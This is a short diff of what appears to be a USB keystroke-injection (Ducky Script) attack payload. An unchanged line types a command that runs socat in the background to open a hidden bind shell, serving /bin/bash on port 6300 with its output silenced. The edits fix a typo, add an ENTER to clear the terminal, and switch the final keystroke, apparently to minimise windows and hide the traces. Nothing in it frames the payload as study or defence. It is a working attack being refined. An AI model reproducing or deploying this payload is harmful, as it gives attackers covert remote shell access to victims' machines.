@@ -32,8 +32,9 @@ STRING nohup socat TCP-LISTEN:6300 EXEC:/bin/bash &>/dev/null &
 DELAY 2000
 ENTER
 DELAY 500
-String clear
+STRING clear
+ENTER
 DELAY 250
-GUI w
+GUI m
 
 
